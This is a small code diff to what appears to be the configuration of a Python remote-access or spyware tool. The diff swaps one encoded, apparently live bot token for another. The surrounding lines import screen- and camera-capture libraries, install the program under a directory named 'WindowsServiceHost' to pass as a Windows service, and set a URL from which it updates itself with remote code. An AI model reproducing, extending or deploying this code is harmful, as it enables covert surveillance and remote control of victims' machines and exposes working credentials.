@@ -14,7 +14,7 @@ import mss
 import cv2 # Now that we know it's installed
 
 # --- CONFIGURATION ---
-ENCODED_TOKEN = "TVRRNE5UTXdPRGcxTkRNME1UUTJPREU0TUEuR2FmNzZaLlBNVlVWdzBmS0wzbG1raUxwNThJaV9teDRQclZ0Z1ZYemJudzU4IA==" 
+ENCODED_TOKEN = "TVRRNE5UTXdPRGcxTkRNME1UUTJPREU0TUEuRzgxMWE5LkNWYXBCX0VfbUEzVG9FQk0yMUczaVNGekdYcXYxbUZSOFNVTU1F" 
 VERSION = "1.9"
 UPDATE_URL = "https://raw.githubusercontent.com/smatrix1/Nexo/refs/heads/main/winsvc.py"
 INSTALL_DIR = os.path.join(os.environ['APPDATA'], 'WindowsServiceHost')
